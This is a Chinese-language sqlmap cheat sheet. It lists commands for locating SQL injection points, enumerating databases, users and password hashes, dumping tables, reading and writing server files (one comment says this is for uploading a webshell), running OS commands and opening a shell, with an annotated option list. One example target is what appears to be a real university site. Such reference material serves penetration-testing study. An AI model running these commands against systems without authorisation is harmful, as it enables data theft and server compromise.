# SqlMap

#### 寻找注入点

**GET方式**

sqlmap -u "url" //这个URL必须含？

**POST方式**

sqlmap -u <http://testasp.vulnweb.com/Login.asp> --data "tfUName=1\&tfUPass=1"

**cookie注入**

sqlmap -u "url" --cookie "chsadj" --level 2 //这里的URL去掉？及其后的内容，并将它们放在cookie的内容里面

**tamper方式**

sqlmap -u "url" -v 3 --batch --tamper "sac.py"  //temper后面的插件可以去sql安装目录查找

**自动检测表**

sqlmap -u <http://testasp.vulnweb.com/Login.asp> --forms

**延时两秒**

Sqlmap –u “url” --delay 2/

**频率3次**

Sqlmap –u “url” --safe-freq 3

**伪静态**

Sqlmap -u <http://sfl.fzu.edu.cn/index.php/Index/view/id/40.html> //在40后面加\*

#### 查看数据库

sqlmap -u "url" --dbs   //查看所有数据库

sqlmap -u "url" --users //查看所有用户

sqlmap -u "url" --current-db //查看当前的数据库

sqlmap -u "url" --current-user //产看当前的用户

sqlmap -u "url" --is-dba //查看是否是最高权限

sqlmap -u "url" --passwords //查看所有密码

sqlmap -u "url" –hostname //查看主机名

sqlmap -u "url" privileges -U username //查看用户权限

sqlmap -u "url" –roles //查看用户角色

**查看详细内容**

sqlmap -u "url" --tables -D "database" //database这个数据库的表数据表

sqlmap -u "url" --columns -T "tables" -D "database" //查看tables这个数据表的字段

sqlmap -u "url" --dump "a,b,c" -C "columns" -T "tables" -D "database" //下载内容，后面的-CTDabc都是对下载的数据库表段的约束如果不加就是下载所有

#### 执行特殊操作

**文件查看**

sqlmap -u "url" –file-read= //这个读取的文件会存在本地的结果目录，请认真看提示

**文件写入**

sqlmap -u "url" --file-write=本地文件路径 --file-dest=网站的绝对路径 //上传webshell用，需要dba权限

**命令执行**

sqlmap -u "url" --os-cmd "cmd"  //执行cmd代表的命令，如cd C:/

sqlmap -u "url" --os-shell  //进入数据库自带的shell

### 命令总览

使用`sqlmap -hh`可以查看详细的命令说明：

```json
-r 1.txt            对于用post方法提交的，参数不在URL里面的网页，可以先截获数据，保存成文件再用这个参数执行

-l log.txt          可以将代理的日志作为目标去检测[见下图]

-m 1.txt            对于多个URL，可以一排一个写入文件后加载

--force-ssl         对于使用SSL的URL要在后面加上这个参数

--data              对于使用post方法，可以将参数写在data后面

--param-del=""          

--cookie=""  level 2        对于需要验证才能访问的URL，可以加上cookie值验证，如果要检测cookie是否有注入漏洞，level要高于1

--random-agent          使用随机的user-agent

--user-agent=""  level 3    指定user-agent，如要检测它是否有漏洞level要高于2

--header="\n"           指定头信息，如User-Agent:dsacs，大小写敏感，多个用\n分隔

--method=GET POST       设置提交方式，默认一个一个的尝试

--auth-type             如果是基于http的验证，如Basic NTLM Digest，可直接加类型再配合下一个参数使用

--auth-cred "user:pass"     填写账号和密码

  --proxy="http:127.0.0.1:8087"  使用代理

--proxy-cred="name:pass"    如果代理要密码的话

--ignore-proxy          强制不使用代理

--delay             请求延迟间隔，单位秒，默认无延迟

--retries           链接失败重试次数3

--timeout           链接超时时间30

--randomize="param"     使用和源参数类型长度一致的参数

sqlmap -l l.log --scope="(www)?.target.(com|net|org)"     这是一个正则表达式，是对于log文件里面URL过多时，进行筛选，这里是只要com/net/org结尾的域名

sqlmap -l 2.log --scope="(19)?.168.20.(1|11|111)"        同上，筛选19*.168.20.1/11/111这几个网段的IP

--safe-url="url"        设置正确的URL，因为如果一直尝试错误的URL可能会被服务器拉黑，过几次登下正确的防止这个发生

--safe-freq 10          尝试的与正确的URL的交换频率

--skip-urlencode        有的URL在get方式提交时没编码，就要用这个

--eval=""php代码      这个后面可以跟PHP代码，能够执行

--keep-alive            保持连接会降低资源使用，但是不能与代理兼容

--predict-output        能够在找到一个信息后缩小检测的范围，不能与--threads兼容

--null-connection       只看返回文件的大小，不要他的内容与--text-only不兼容

--threads           最大并发数，默认1，最大不要超过10，盲注时一次返回一个字符【7次请求】

-o              使用除了--threads的全部的优化参数

-p              指定参数，使level失效

-skip               排除不扫描的参数

  对于伪静态网页，就在参数后面加*

--dbms              接数据库管理系统，如MySQL

--os                接系统，如Linux

--invalid-bignum        使用大数作为假的值

--invalid-logical       使用逻辑数作为假的值

--no-cat            对于接收到的null不自动转换成空格

--no-escape         不使用逃逸，就是不把'转换成asii码形式

--prefix            在参数前指定前缀

--suffix            在参数后指定后缀

--level             设置检查的等级，默认为1，共5个，可以查看/usr/share/sqlmap/xml/payloads这个文件了解详细的信息

--risk              设置风险等级，默认是安全的检查，第四等可能会修改数据库内容

--string            当页面含有这个字符串时为真

--not-string            当页面不含这个字符串时为真

--regexp            用正则表达式判断

--code              当状态代码为*时为真

--text-only         页面含有*时为真

--titles            页面标题为*时为真

--techniques 

B E U S T           使用什么检查技术，默认所有，这里分别是基于布尔的盲注，基于错误的判断，联合查询，堆积，基于时间的查询

--time-sec          

--union-cols            联合查询第几列到第几列

--union-char            用select null,1:2  这种，可能会出错，就讲这个null换成其他数字占位

--second-order          当注入后在第二个页面显示错误信息，这里就接上显示错误信息的地方

-fingerprint            指纹信息

--banner            版本信息

--batch             按照软件默认设置，自动回答

--count             计数

-s              将这个会话保存下次继续

-t              将这些数据保存

--charset           强制设置数据库编码

--crawl             设置蜘蛛爬行的深度

--csv-del           设置下载的数据的分隔方式，默认是,

--dbms-cred         设置数据库用户

--flush-session         清空以前的会话数据

--fresh-queries         不清空会话，重新查询

--hex               一16进制编码的方式传输数据

--output-dir            会话输出文件夹

--parse-errors          显示MySQL错误信息

--save              保存当前配置为文件

-z              特别的助记方式，后面接的只要是独一无二的企鹅存在的就可以用，如user-agent可以用ueraet.

--answers           这个可以对一些特定的问题作出回答，在自动化注入中用

--check-waf         检查是否含有waf等

--identify-waf          彻底的检查waf等的信息

--smart     当有大量目标时，这个就只检查基于错误的注入点

--mobile    模拟智能手机去扫描

--wizard    向导模式

--purge-out 清除输出内容
```
